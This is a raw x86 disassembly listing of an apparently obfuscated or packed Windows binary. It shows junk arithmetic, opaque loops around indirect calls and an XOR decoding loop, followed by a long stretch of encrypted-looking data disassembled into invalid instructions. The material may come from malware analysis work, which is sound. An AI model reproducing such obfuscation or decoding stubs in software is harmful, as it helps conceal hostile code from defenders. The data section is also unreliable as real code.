  411a57:	jae    0x411a7f
  411a5d:	cmp    DWORD PTR ds:0x42867b,0x24
  411a64:	ja     0x411a7f
  411a6a:	jmp    0x411a7a
  411a6f:	push   0x42801b
  411a74:	call   DWORD PTR ds:0x4287c3
  411a7a:	jmp    0x411a43
  411a7f:	mov    edi,0x3b56
  411a84:	adc    DWORD PTR ds:0x428657,0x6690
  411a8e:	add    cx,di
  411a91:	sub    DWORD PTR ds:0x42863f,0x428617
  411a9b:	movzx  ecx,cx
  411a9e:	xor    DWORD PTR ds:0x428633,0x428667
  411aa8:	mov    DWORD PTR [ebp-0xc],ecx
  411aab:	or     DWORD PTR ds:0x42862f,edx
  411ab1:	mov    ecx,DWORD PTR [ebp+0x8]
  411ab4:	movzx  ecx,WORD PTR [ecx+edx*4]
  411ab8:	add    DWORD PTR ds:0x4285e7,0xc83
  411ac2:	xor    ecx,0x8a94
  411ac8:	sub    DWORD PTR ds:0x42860f,0x428677
  411ad2:	add    ecx,edi
  411ad4:	mov    edi,DWORD PTR [ebp-0xc]
  411ad7:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411ade:	inc    edx
  411adf:	mov    ecx,DWORD PTR [ebp-0x10]
  411ae2:	mov    DWORD PTR ds:0x428637,0x76f
  411aec:	cmp    edx,ecx
  411aee:	mov    DWORD PTR ds:0x428647,0x6bd4
  411af8:	jne    0x40f686
  411afe:	and    DWORD PTR ds:0x428647,0x0
  411b08:	mov    ecx,DWORD PTR ds:0x428647
  411b0e:	inc    ecx
  411b0f:	mov    DWORD PTR ds:0x428647,ecx
  411b15:	cmp    DWORD PTR ds:0x428647,0x1b
  411b1c:	jbe    0x411b4e
  411b22:	jmp    0x411b41
  411b27:	push   0x428603
  411b2c:	push   DWORD PTR [ebp-0x14]
  411b2f:	push   DWORD PTR [ebp-0x28]
  411b32:	push   DWORD PTR [ebp-0x10]
  411b35:	push   DWORD PTR [ebp-0x10]
  411b38:	push   DWORD PTR [ebp-0x20]
  411b3b:	call   DWORD PTR ds:0x4287c7
  411b41:	cmp    DWORD PTR ds:0x428647,0x17
  411b48:	jb     0x411b08
  411b4e:	mov    ecx,DWORD PTR [ebp-0x18]
  411b51:	xor    edi,edi
  411b53:	mov    edx,DWORD PTR [ebp+0x10]
  411b56:	adc    DWORD PTR ds:0x42864b,ecx
  411b5c:	xor    ecx,eax
  411b5e:	add    ecx,esi
  411b60:	mov    DWORD PTR [edx],ecx
  411b62:	mov    ecx,DWORD PTR [ebp-0x18]
  411b65:	xor    ecx,eax
  411b67:	add    ecx,esi
  411b69:	adc    DWORD PTR ds:0x4285d7,ebx
  411b6f:	mov    DWORD PTR [ebp-0xc],ecx
  411b72:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  411b79:	adc    edi,DWORD PTR ds:0x428663
  411b7f:	mov    DWORD PTR [ebp-0x14],0xf89c8580
  411b86:	or     DWORD PTR ds:0x42866b,ebx
  411b8c:	mov    DWORD PTR [ebp-0x10],0xf89c95b0
  411b93:	sub    DWORD PTR ds:0x428673,edx
  411b99:	mov    ecx,DWORD PTR [ebp-0x14]
  411b9c:	and    DWORD PTR ds:0x428637,edi
  411ba2:	mov    DWORD PTR [ebp+0x8],ecx
  411ba5:	mov    ecx,DWORD PTR [ebp+0x8]
  411ba8:	mov    edi,DWORD PTR ds:0x42865f
  411bae:	adc    DWORD PTR ds:0x428613,edi
  411bb4:	xor    ecx,eax
  411bb6:	add    ecx,esi
  411bb8:	mov    ecx,0x242ebcc
  411bbd:	mov    DWORD PTR ds:0x428613,0x3550
  411bc7:	mov    edi,0xf641bc3
  411bcc:	mov    DWORD PTR ds:0x428633,0x2c84
  411bd6:	je     0x41b172
  411bdc:	mov    ebx,DWORD PTR ds:0x4286b7
  411be2:	mov    edx,DWORD PTR ds:0x4286e3
  411be8:	sub    edx,ebx
  411bea:	imul   ebx,DWORD PTR [ebx+edx*1]
  411bee:	mov    edx,DWORD PTR [ebp+0x8]
  411bf1:	movzx  ebx,BYTE PTR ds:0x4285ef
  411bf8:	sub    DWORD PTR ds:0x428657,ebx
  411bfe:	mov    ebx,DWORD PTR [ebp-0x8]
  411c01:	adc    DWORD PTR ds:0x42860f,0x4285eb
  411c0b:	xor    edx,eax
  411c0d:	sub    DWORD PTR ds:0x428643,0x428673
  411c17:	xor    ebx,eax
  411c19:	sub    edx,ebx
  411c1b:	and    DWORD PTR ds:0x42866f,ecx
  411c21:	sub    edx,esi
  411c23:	xor    edx,eax
  411c25:	adc    DWORD PTR ds:0x42865b,ebx
  411c2b:	mov    DWORD PTR [ebp+0x8],edx
  411c2e:	mov    edx,DWORD PTR ds:0x42867f
  411c34:	mov    ebx,DWORD PTR ds:0x4286fb
  411c3a:	sub    ebx,edx
  411c3c:	imul   edx,DWORD PTR [edx+ebx*1]
  411c40:	mov    edx,DWORD PTR [ebp+0x8]
  411c43:	and    DWORD PTR ds:0x428647,0x0
  411c4d:	jmp    0x411c61
  411c52:	xor    ebx,ebx
  411c54:	xor    ebx,DWORD PTR ds:0x428647
  411c5a:	inc    ebx
  411c5b:	mov    DWORD PTR ds:0x428647,ebx
  411c61:	cmp    DWORD PTR ds:0x428647,0x14
  411c68:	jae    0x411cb1
  411c6e:	cmp    DWORD PTR ds:0x428647,0xc
  411c75:	jle    0x411cb1
  411c7b:	jmp    0x411c90
  411c80:	push   0x4285d3
  411c85:	push   0x42800b
  411c8a:	call   DWORD PTR ds:0x4287cb
  411c90:	cmp    DWORD PTR ds:0x428647,0xb
  411c97:	jne    0x411cac
  411c9d:	xor    ebx,ebx
  411c9f:	xor    ebx,DWORD PTR ds:0x428647
  411ca5:	inc    ebx
  411ca6:	mov    DWORD PTR ds:0x428647,ebx
  411cac:	jmp    0x411c52
  411cb1:	mov    ebx,DWORD PTR [ebp-0x58]
  411cb4:	not    DWORD PTR ds:0x4285e3
  411cba:	add    edx,0x5708f1
  411cc0:	sbb    DWORD PTR ds:0x42866f,0xe9d
  411cca:	imul   edx,ebx
  411ccd:	mov    DWORD PTR [ebp-0x58],edx
  411cd0:	mov    edx,DWORD PTR [ebp+0x8]
  411cd3:	movzx  ebx,WORD PTR ds:0x42863f
  411cda:	xor    DWORD PTR ds:0x428677,ebx
  411ce0:	mov    ebx,DWORD PTR [ebp-0x54]
  411ce3:	add    edx,0x64f893
  411ce9:	or     edx,ebx
  411ceb:	dec    ebx
  411cec:	mov    DWORD PTR [ebp-0x54],edx
  411cef:	mov    edx,DWORD PTR [ebp+0x8]
  411cf2:	xor    DWORD PTR ds:0x428613,edi
  411cf8:	mov    ebx,DWORD PTR [ebp-0x50]
  411cfb:	adc    DWORD PTR ds:0x42862b,0x428663
  411d05:	add    edx,ecx
  411d07:	xor    edx,ebx
  411d09:	inc    DWORD PTR ds:0x42864b
  411d0f:	mov    DWORD PTR [ebp-0x50],edx
  411d12:	sbb    DWORD PTR ds:0x42865f,0x428633
  411d1c:	mov    edx,DWORD PTR [ebp+0x8]
  411d1f:	add    DWORD PTR ds:0x42863f,0x2dae
  411d29:	mov    ebx,DWORD PTR [ebp-0x4c]
  411d2c:	add    edx,edi
  411d2e:	inc    DWORD PTR ds:0x428617
  411d34:	and    edx,ebx
  411d36:	and    ebx,0x7d1c
  411d3c:	mov    DWORD PTR [ebp-0x4c],edx
  411d3f:	xor    DWORD PTR ds:0x428613,0x4285ef
  411d49:	mov    edx,DWORD PTR [ebp+0x8]
  411d4c:	mov    ebx,DWORD PTR [ebp-0x48]
  411d4f:	lea    edx,[ebx+edx*1+0x241fcde]
  411d56:	mov    ebx,DWORD PTR ds:0x42863f
  411d5c:	and    DWORD PTR ds:0x428633,ebx
  411d62:	mov    DWORD PTR [ebp-0x48],edx
  411d65:	or     ebx,0x3ec
  411d6b:	mov    edx,DWORD PTR [ebp+0x8]
  411d6e:	mov    ebx,0xfa5e1521
  411d73:	or     DWORD PTR ds:0x428647,0x60bd
  411d7d:	sub    ebx,edx
  411d7f:	add    edx,DWORD PTR ds:0x42866f
  411d85:	add    ebx,DWORD PTR [ebp-0x44]
  411d88:	mov    DWORD PTR [ebp-0x44],ebx
  411d8b:	and    DWORD PTR ds:0x42867b,0x0
  411d95:	jmp    0x411da7
  411d9a:	mov    edx,DWORD PTR ds:0x42867b
  411da0:	inc    edx
  411da1:	mov    DWORD PTR ds:0x42867b,edx
  411da7:	cmp    DWORD PTR ds:0x42867b,0x18
  411dae:	jae    0x411dfe
  411db4:	cmp    DWORD PTR ds:0x42867b,0xa
  411dbb:	jge    0x411dfe
  411dc1:	jmp    0x411ddf
  411dc6:	push   DWORD PTR [ebp-0x14]
  411dc9:	push   DWORD PTR [ebp-0x20]
  411dcc:	push   0x73a3
  411dd1:	push   DWORD PTR [ebp-0xc]
  411dd4:	push   0x249b
  411dd9:	call   DWORD PTR ds:0x42879f
  411ddf:	cmp    DWORD PTR ds:0x42867b,0x9
  411de6:	jne    0x411df9
  411dec:	mov    edx,DWORD PTR ds:0x42867b
  411df2:	inc    edx
  411df3:	mov    DWORD PTR ds:0x42867b,edx
  411df9:	jmp    0x411d9a
  411dfe:	mov    edx,DWORD PTR [ebp+0x8]
  411e01:	adc    DWORD PTR ds:0x4285d3,0x42865b
  411e0b:	xor    edx,eax
  411e0d:	or     DWORD PTR ds:0x428657,0x7d10
  411e17:	add    edx,esi
  411e19:	mov    DWORD PTR ds:0x428613,0x2646
  411e23:	jne    0x411bdc
  411e29:	jmp    0x41b172
  411e2e:	and    ebx,DWORD PTR ds:0x428603
  411e34:	mov    edx,DWORD PTR [ebp-0xc]
  411e37:	sub    edx,esi
  411e39:	add    ebx,0x210e
  411e3f:	xor    edx,eax
  411e41:	mov    DWORD PTR [ebp-0x5c],edx
  411e44:	and    DWORD PTR ds:0x4285ef,0x0
  411e4e:	jmp    0x411e62
  411e53:	xor    ebx,ebx
  411e55:	add    ebx,DWORD PTR ds:0x4285ef
  411e5b:	inc    ebx
  411e5c:	mov    DWORD PTR ds:0x4285ef,ebx
  411e62:	cmp    DWORD PTR ds:0x4285ef,0x17
  411e69:	jae    0x411ea9
  411e6f:	cmp    DWORD PTR ds:0x4285ef,0xe
  411e76:	ja     0x411ea9
  411e7c:	jmp    0x411e8a
  411e81:	push   DWORD PTR [ebp-0xc]
  411e84:	call   DWORD PTR ds:0x4287a3
  411e8a:	cmp    DWORD PTR ds:0x4285ef,0xd
  411e91:	jne    0x411ea4
  411e97:	mov    ebx,DWORD PTR ds:0x4285ef
  411e9d:	inc    ebx
  411e9e:	mov    DWORD PTR ds:0x4285ef,ebx
  411ea4:	jmp    0x411e53
  411ea9:	mov    edx,DWORD PTR [ebp-0x10]
  411eac:	mov    DWORD PTR ds:0x4285db,0x15
  411eb6:	cmp    DWORD PTR ds:0x4285db,0x0
  411ebd:	je     0x411f11
  411ec3:	cmp    DWORD PTR ds:0x4285db,0x6
  411eca:	jl     0x411f11
  411ed0:	jmp    0x411ee5
  411ed5:	push   0x12dd
  411eda:	push   0x428000
  411edf:	call   DWORD PTR ds:0x4287a7
  411ee5:	cmp    DWORD PTR ds:0x4285db,0x7
  411eec:	jne    0x411eff
  411ef2:	mov    ebx,DWORD PTR ds:0x4285db
  411ef8:	dec    ebx
  411ef9:	mov    DWORD PTR ds:0x4285db,ebx
  411eff:	mov    ebx,DWORD PTR ds:0x4285db
  411f05:	dec    ebx
  411f06:	mov    DWORD PTR ds:0x4285db,ebx
  411f0c:	jmp    0x411eb6
  411f11:	mov    ebx,DWORD PTR [ebp-0x8]
  411f14:	xor    edx,eax
  411f16:	xor    DWORD PTR ds:0x42863b,0x3a5d
  411f20:	xor    ebx,eax
  411f22:	sub    edx,ebx
  411f24:	adc    DWORD PTR ds:0x42860f,0x428633
  411f2e:	sub    edx,esi
  411f30:	and    DWORD PTR ds:0x42864f,0x428607
  411f3a:	xor    edx,eax
  411f3c:	mov    DWORD PTR ds:0x428663,0x12b9
  411f46:	mov    DWORD PTR [ebp-0x10],edx
  411f49:	movzx  edx,WORD PTR ds:0x42863f
  411f50:	mov    edx,DWORD PTR [ebp-0x14]
  411f53:	mov    DWORD PTR [ebp+0x8],edx
  411f56:	jmp    0x414473
  411f5b:	adc    DWORD PTR ds:0x42866b,0x365a
  411f65:	mov    edx,DWORD PTR [ebp+0x8]
  411f68:	add    DWORD PTR ds:0x42865b,0x2d5e
  411f72:	mov    ebx,DWORD PTR [ebp-0x8]
  411f75:	xor    edx,eax
  411f77:	xor    ebx,eax
  411f79:	jmp    0x41431a
  411f7e:	push   0xf
  411f80:	xor    al,0x44
  411f82:	pop    ss
  411f83:	inc    edi
  411f84:	or     al,BYTE PTR [edi]
  411f86:	into   
  411f87:	addr16 mov ds:0xef4,al
  411f8b:	mov    eax,ds:0x82c63546
  411f90:	jp     0x41200c
  411f92:	(bad)  
  411f93:	pop    edi
  411f94:	jp     0x412010
  411f96:	or     al,BYTE PTR [edx+0x6bbd2ede]
  411f9c:	adc    eax,0x3ae3a4c5
  411fa1:	mov    edx,esp
  411fa3:	pop    ds
  411fa4:	loope  0x411fb0
  411fa6:	push   ebx
  411fa7:	jns    0x411f91
  411fa9:	aam    0xad
  411fab:	xchg   esi,eax
  411fac:	fcomp  DWORD PTR [esi]
  411fae:	xchg   edi,eax
  411faf:	cmp    ah,dl
  411fb1:	sbb    al,0x93
  411fb3:	ret    0x9a7a
  411fb6:	push   edx
  411fb7:	sbb    ebp,ecx
  411fb9:	mov    eax,ds:0x57075a4c
  411fbe:	add    eax,DWORD PTR [esi+0x48]
  411fc1:	push   esi
  411fc2:	inc    ebp
  411fc3:	jb     0x411f9c
  411fc5:	fisub  WORD PTR [ebx+0x56b040e2]
  411fcb:	hlt    
  411fcc:	repz mov edi,DWORD PTR [esp+ebx*1]
  411fd0:	dec    ebp
  411fd1:	jp     0x411faa
  411fd3:	dec    ebp
  411fd4:	retf   0x3191
  411fd7:	mov    ebx,0x8b1b483d
  411fdc:	push   ecx
  411fdd:	add    al,0x6e
  411fdf:	mov    cl,0xf1
  411fe1:	cmp    edi,eax
  411fe3:	add    al,0x2f
  411fe5:	push   ecx
  411fe6:	jo     0x411fd9
  411fe8:	sahf   
  411fe9:	retf   
  411fea:	int    0x7e
  411fec:	fxch   st(7)
  411fee:	sub    ch,dh
  411ff0:	pop    ss
  411ff1:	adc    bh,dh
  411ff3:	repnz dec eax
  411ff5:	push   esp
  411ff6:	cld    
  411ff7:	lock inc edx
  411ff9:	mov    bl,BYTE PTR [edx-0x12]
  411ffc:	jne    0x412035
  411ffe:	std    
  411fff:	stos   BYTE PTR es:[edi],al
  412000:	xchg   BYTE PTR [esi],bl
  412002:	or     al,0x99
  412004:	(bad)  
  412005:	in     eax,dx
  412006:	call   0x8d9e3988
  41200b:	pop    eax
  41200c:	pop    ebp
  41200d:	sbb    eax,0x6f0e0759
  412012:	mov    eax,0x5d86285
  412017:	in     al,0x33
  412019:	shr    DWORD PTR [ebx-0x27],cl
  41201c:	dec    ebx
  41201d:	cmc    
  41201e:	add    DWORD PTR [ecx+edi*8-0x3ac651d5],edi
  412025:	jg     0x4120a5
  412027:	stc    
  412028:	mov    ebp,0x79504b5d
  41202d:	mov    DWORD PTR [eax+0x195d3180],ebp
  412033:	and    BYTE PTR [esi-0x1d],dh
  412036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412037:	call   0x33d0f5d3
  41203c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41203d:	and    eax,0xca6ee5b1
  412042:	mov    edx,0x90458a3
  412047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412048:	jns    0x411fe1
  41204a:	ror    DWORD PTR [ebp+0x6b],1
  41204d:	mov    edx,0x35e61f98
  412052:	scas   eax,DWORD PTR es:[edi]
  412053:	dec    ebx
  412054:	nop
  412055:	(bad)  
  412056:	fsincos 
  412058:	dec    edx
  412059:	xchg   BYTE PTR [esi+ecx*1-0x78],bh
  41205d:	inc    eax
  41205e:	push   ebx
  41205f:	sbb    al,0x76
  412061:	pop    edx
  412062:	scas   al,BYTE PTR es:[edi]
  412063:	push   0xd6054979
  412068:	mov    WORD PTR [esi+0x267325b],cs
  41206e:	sub    al,0x52
  412070:	js     0x41203e
  412072:	jge    0x412046
  412074:	ins    BYTE PTR es:[edi],dx
  412075:	pop    ebp
  412076:	cmc    
  412077:	mov    WORD PTR [ebx+edx*2-0xb],?
  41207b:	ins    BYTE PTR es:[edi],dx
  41207c:	mov    BYTE PTR [esi+0x7dabe25a],cl
  412082:	xor    BYTE PTR [ebp+0x4e],0x73
  412086:	fiadd  DWORD PTR [eax*2+0xd0cdbb1]
  41208d:	into   
  41208e:	add    DWORD PTR [edi-0x1f397d2a],esi
  412094:	ret    
  412095:	loop   0x412056
  412097:	leave  
  412098:	dec    ecx
  412099:	ficom  DWORD PTR [ebp-0xb]
  41209c:	xor    ch,BYTE PTR [ecx-0xf02e506]
  4120a2:	fnstsw WORD PTR [ecx-0x7]
  4120a5:	(bad)  
  4120a7:	mov    cl,0x54
  4120a9:	test   al,0x14
  4120ab:	hlt    
  4120ac:	mov    ?,WORD PTR [ebx+0x24]
  4120af:	outs   dx,BYTE PTR ds:[esi]
  4120b0:	les    ecx,FWORD PTR [edi-0x46348a58]
  4120b6:	aad    0xfa
  4120b8:	fwait
  4120b9:	adc    DWORD PTR [ebx-0x64],edx
  4120bc:	and    DWORD PTR [esi-0x39],eax
  4120bf:	lds    esi,FWORD PTR [eax+0x44]
  4120c2:	shr    DWORD PTR [ecx],cl
  4120c4:	inc    esp
  4120c5:	pop    edx
  4120c6:	mov    ebp,0x7444b9de
  4120cb:	push   ss
  4120cc:	inc    ebp
  4120cd:	xlat   BYTE PTR ds:[ebx]
  4120ce:	fldenv [esi+0x6681749c]
  4120d4:	mov    WORD PTR [ecx-0x137faffd],?
  4120da:	popf   
  4120db:	repz push esp
  4120dd:	sbb    bh,BYTE PTR [edx+0x68c6061c]
  4120e3:	sub    eax,0xff0a234a
  4120e8:	daa    
  4120e9:	mov    WORD PTR [eax-0x4cbb8c69],?
  4120ef:	pop    eax
  4120f0:	out    0x43,eax
  4120f2:	test   eax,0x874cf328
  4120f7:	jecxz  0x412098
  4120f9:	scas   al,BYTE PTR es:[edi]
  4120fa:	or     ch,dl
  4120fc:	mov    esp,0xdab6e5b8
  412101:	ins    BYTE PTR es:[edi],dx
  412102:	(bad)  
  412103:	mov    edx,0x1bd70f56
  412108:	or     DWORD PTR [ecx-0x5c],ecx
  41210b:	mov    ah,0x5c
  41210d:	sbb    eax,0x5555e254
  412112:	jge    0x4120e9
  412114:	jnp    0x4120a5
  412116:	bnd jb 0x4120bf
  412119:	jnp    0x4120c6
  41211b:	cwde   
  41211c:	push   edi
  41211d:	or     al,0xa
  41211f:	pop    eax
  412120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412121:	popf   
  412122:	pushf  
  412123:	in     eax,dx
  412124:	inc    eax
  412125:	test   eax,0xd96bb048
  41212a:	sar    ch,1
  41212c:	cli    
  41212d:	jle    0x4120e6
  41212f:	sbb    al,0x28
  412131:	jl     0x475cacee
  412137:	push   ebp
  412138:	sbb    al,BYTE PTR [esi+0x4f]
  41213b:	and    esi,DWORD PTR [edi+0x1330f08]
  412141:	cmp    eax,0x9f0d9d96
  412146:	push   ss
  412147:	adc    BYTE PTR [ecx+0x7a90e8e9],0xbb
  41214e:	js     0x412135
  412150:	out    0x7d,eax
  412152:	mov    al,0x37
  412154:	shl    DWORD PTR [esi],0x5e
  412157:	xchg   esp,eax
  412158:	call   0xe723:0xb4b2a363
  41215f:	inc    esi
  412160:	mov    ah,0xb2
  412162:	(bad)  
  412163:	loopne 0x4120f7
  412165:	jmp    0xf0d6:0xf809504b
  41216c:	mov    al,0xf5
  41216e:	adc    BYTE PTR [ecx-0x17],cl
  412171:	ret    0xccb7
  412174:	lds    esp,FWORD PTR [eax-0x394d4784]
  41217a:	pop    eax
  41217b:	inc    eax
  41217c:	xchg   ecx,eax
  41217d:	lods   eax,DWORD PTR ds:[esi]
  41217e:	cmp    al,0xb
  412180:	lods   al,BYTE PTR ds:[esi]
  412181:	pushf  
  412182:	cmp    bh,BYTE PTR [eax-0x21e6dba0]
  412188:	popa   
  412189:	je     0x41219e
  41218b:	mov    edx,cs
  41218d:	push   ebp
  41218e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41218f:	mov    al,ds:0x14aa62ea
  412194:	outs   dx,BYTE PTR ds:[esi]
  412195:	fiadd  DWORD PTR [esp+ecx*2+0x9]
  412199:	nop
  41219a:	pop    edi
  41219b:	pop    esp
  41219c:	popa   
  41219d:	cmp    DWORD PTR [eax+0x1294e287],ebp
  4121a3:	imul   ecx,DWORD PTR [ebx+0x0],0xffffffac
  4121a7:	and    BYTE PTR [ecx],0x91
  4121aa:	pop    ebx
  4121ab:	(bad)  [ebx-0x2b80bca5]
  4121b1:	push   eax
  4121b2:	sbb    BYTE PTR [ebx],cl
  4121b4:	shl    bl,0x42
  4121b7:	dec    ebp
  4121b8:	xor    BYTE PTR [ecx],ah
  4121ba:	ss jmp 0x7cab552b
  4121c0:	push   esp
  4121c1:	in     al,0x68
  4121c3:	push   cs
  4121c4:	cmp    al,0x2f
  4121c6:	inc    eax
  4121c7:	lock xchg esi,eax
  4121c9:	jg     0x412171
  4121cb:	push   0x8abfeca2
  4121d0:	nop
  4121d1:	loopne 0x4121ca
  4121d3:	pop    es
  4121d4:	pop    es
  4121d5:	loop   0x41224b
  4121d7:	or     al,0xef
  4121d9:	scas   eax,DWORD PTR es:[edi]
  4121da:	aad    0x5b
  4121dc:	shl    BYTE PTR [edx-0x14b185ca],1
  4121e2:	into   
  4121e3:	ret    0xadf9
  4121e6:	enter  0x230c,0x45
  4121ea:	out    dx,eax
  4121eb:	add    al,0x4e
  4121ed:	aas    
  4121ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121ef:	imul   ecx,DWORD PTR [eax],0xffffffc2
  4121f2:	mov    esp,0x24b4a0a7
  4121f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121f8:	dec    edx
  4121f9:	pop    es
  4121fa:	push   0x4b
  4121fc:	test   al,0xc0
  4121fe:	das    
  4121ff:	add    eax,0x7570223f
  412204:	dec    edx
  412205:	je     0x4121c3
  412207:	gs pop ebp
  412209:	pop    edx
  41220a:	sub    BYTE PTR [esi+0x12],al
  41220d:	mov    ds:0x353a9654,eax
  412212:	push   esp
  412213:	inc    ecx
  412214:	add    edx,DWORD PTR [ebx]
  412216:	shr    ebp,cl
  412218:	mov    esi,0x9ab41000
  41221d:	fstp   DWORD PTR [ebp+0x1b6c8760]
  412223:	jo     0x412282
  412225:	sahf   
  412226:	(bad)  
  412227:	push   ebp
  412228:	cmc    
  412229:	dec    ecx
  41222a:	shl    DWORD PTR [edx+eiz*4+0x49],0xd4
  41222f:	repnz push cs
  412231:	adc    esp,esp
  412233:	out    0xc3,eax
  412235:	aas    
  412236:	dec    ebp
  412237:	popaw  
  412239:	repz ret 0x1242
  41223d:	sub    eax,0x2338036f
  412242:	jbe    0x4121c8
  412244:	in     eax,0xb6
  412246:	cmp    BYTE PTR [esi-0x58004708],ch
  41224c:	test   BYTE PTR [edx-0x39cb39f9],ch
  412252:	test   BYTE PTR [esi+0x7],bh
  412255:	dec    esi
  412256:	jmp    0x9084:0xc79ffd78
  41225d:	push   esi
  41225e:	mov    BYTE PTR [edi+0x6d50c529],ch
  412264:	lea    ebp,[edi-0x136bd5d8]
  41226a:	xchg   esi,eax
  41226b:	fs out 0x99,eax
  41226e:	stos   BYTE PTR es:[edi],al
  41226f:	call   0xb9b2:0x82c6c79b
  412276:	gs push cs
  412278:	stos   DWORD PTR es:[edi],eax
  412279:	xor    edi,DWORD PTR [ecx-0xa]
  41227c:	dec    ecx
  41227d:	sub    BYTE PTR [esi],bh
  41227f:	test   DWORD PTR [ecx+esi*4-0x35],0xca2e3c15
  412287:	mov    dl,0x34
  412289:	loope  0x4122a3
  41228b:	xor    dh,BYTE PTR [ebx]
  41228d:	loop   0x412309
  41228f:	icebp  
  412290:	xchg   esi,eax
  412291:	push   cs
  412292:	mov    ax,0x42d2
  412296:	pop    ss
  412297:	pop    ds
  412298:	stos   DWORD PTR es:[edi],eax
  412299:	loope  0x412312
  41229b:	jne    0x41227e
  41229d:	jae    0x412286
  41229f:	jl     0x412275
  4122a1:	stos   BYTE PTR es:[edi],al
  4122a2:	ficom  WORD PTR [eax]
  4122a4:	mov    eax,0x7d9ccabe
  4122a9:	inc    esi
  4122aa:	xchg   edi,eax
  4122ab:	push   eax
  4122ac:	mov    ah,0xc4
  4122ae:	jb     0x412316
  4122b0:	mov    bl,0x1c
  4122b2:	inc    edx
  4122b3:	pop    es
  4122b4:	adc    BYTE PTR [esi-0x28],al
  4122b7:	lahf   
  4122b8:	aad    0xf3
  4122ba:	pop    ds
  4122bb:	enter  0x971d,0x50
  4122bf:	adc    DWORD PTR [ecx],0x3077daae
  4122c5:	inc    edi
  4122c6:	aaa    
  4122c7:	fmul   QWORD PTR [eax+0x52]
  4122ca:	add    al,0x8e
  4122cc:	inc    eax
  4122cd:	hlt    
  4122ce:	jmp    0x1023459d
  4122d3:	aam    0x41
  4122d5:	ficom  DWORD PTR [esi+eiz*1]
  4122d8:	ret    
  4122d9:	jb     0x412296
  4122db:	and    ebp,DWORD PTR [eax-0x16]
  4122de:	sub    dl,BYTE PTR [edi+0x51]
  4122e1:	std    
  4122e2:	or     cl,ch
  4122e4:	xchg   esp,eax
  4122e5:	jl     0x412274
  4122e7:	mov    WORD PTR [ecx],cs
  4122e9:	cld    
  4122ea:	jg     0x4122fd
  4122ec:	cmp    BYTE PTR [esi-0x3aed513b],al
  4122f2:	pop    edi
  4122f3:	mov    ch,0xd7
  4122f5:	jnp    0x412367
  4122f7:	ins    DWORD PTR es:[edi],dx
  4122f8:	and    dl,ah
  4122fa:	mov    esi,eax
  4122fc:	inc    ebx
  4122fd:	jno    0x412300
  4122ff:	or     esi,DWORD PTR [ebx]
  412301:	test   DWORD PTR [edx-0x75],ebx
  412304:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412305:	rol    DWORD PTR [esi+eax*8+0x2b],cl
  412309:	and    BYTE PTR [ebx],ah
  41230b:	dec    ecx
  41230c:	retf   0x46bc
  41230f:	cwde   
  412310:	test   DWORD PTR [edx+eiz*4-0x3d2da22b],edx
  412317:	out    dx,eax
  412318:	jecxz  0x41235a
  41231a:	enter  0x3e0d,0xe1
  41231e:	mov    ds:0xc34647ca,al
  412323:	enter  0x1e93,0xde
  412327:	pop    ecx
  412328:	mov    al,0xd6
  41232a:	mov    ah,BYTE PTR [eiz*1-0x36cb7f01]
  412331:	ja     0x41232e
  412333:	out    0xa8,eax
  412335:	icebp  
  412336:	std    
  412337:	fild   QWORD PTR [ebx]
  412339:	and    eax,DWORD PTR [edi]
  41233b:	xor    al,0xd6
  41233d:	pop    ecx
  41233e:	push   0x69
  412340:	ret    
  412341:	loop   0x4122db
  412343:	mov    esp,0x7bf00a18
  412348:	das    
  412349:	xor    edi,edi
  41234b:	mov    ecx,0xf098e876
  412351:	loop   0x412391
  412353:	pop    es
  412354:	adc    ch,BYTE PTR [ecx-0x61]
  412357:	lahf   
  412358:	sbb    BYTE PTR [esp+ecx*2-0x7],al
  41235c:	fsub   DWORD PTR [edi+eiz*1]
  41235f:	lds    edx,FWORD PTR [esp+eiz*8+0x2b0fad96]
  412366:	aam    0x61
  412368:	fnstsw WORD PTR [edx-0x36]
  41236b:	mov    eax,ds:0x66da24ce
  412370:	cmp    ebp,ebx
  412372:	inc    esp
  412373:	je     0x41235e
  412375:	sub    al,0xfe
  412377:	and    eax,0xfb3a5d9b
  41237c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41237d:	dec    edi
  41237f:	mov    eax,ds:0x1f9ccf9e
  412384:	pop    eax
  412385:	mov    bh,0x95
  412387:	xor    BYTE PTR [edi],0x0
  41238a:	push   edx
  41238b:	cmc    
  41238c:	push   ss
  41238d:	mov    ebx,0x4339e352
  412392:	dec    ebx
  412393:	mov    eax,0x38b1654e
  412398:	sbb    BYTE PTR [eax-0x1f],dh
  41239b:	scas   eax,DWORD PTR es:[edi]
  41239c:	mov    BYTE PTR [eax],ch
  41239e:	push   edi
  41239f:	imul   esi,esi,0x6a739215
  4123a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a6:	daa    
  4123a7:	mov    ebp,0x482573db
  4123ac:	adc    eax,0x23bc1c09
  4123b1:	adc    ch,dl
  4123b3:	sbb    al,0xa9
  4123b5:	push   esp
  4123b6:	adc    eax,0x14e1812
  4123bb:	out    0x8,eax
  4123bd:	or     BYTE PTR [edi-0x5a598e98],cl
  4123c3:	jp     0x4123c0
  4123c5:	in     al,dx
  4123c6:	fstp   TBYTE PTR [eax+0x56]
  4123c9:	or     al,0x92
  4123cb:	nop
  4123cc:	hlt    
  4123cd:	xchg   esi,eax
  4123ce:	mov    BYTE PTR ds:0xb48cd588,ah
  4123d4:	out    0x50,al
  4123d6:	(bad)  
  4123d7:	lods   al,BYTE PTR ds:[esi]
  4123d8:	out    dx,al
  4123d9:	(bad)  
  4123db:	or     DWORD PTR [edx],0x18
  4123de:	push   ebp
  4123df:	inc    esi
  4123e0:	int3   
  4123e1:	int3   
  4123e2:	test   BYTE PTR [ebx-0x275cb0aa],0xec
  4123e9:	outs   dx,DWORD PTR ds:[esi]
  4123ea:	mov    ebp,DWORD PTR [ecx]
  4123ec:	or     BYTE PTR [ebp+0x7f],ch
  4123ef:	push   ecx
  4123f0:	pushf  
  4123f1:	in     eax,0x30
  4123f3:	das    
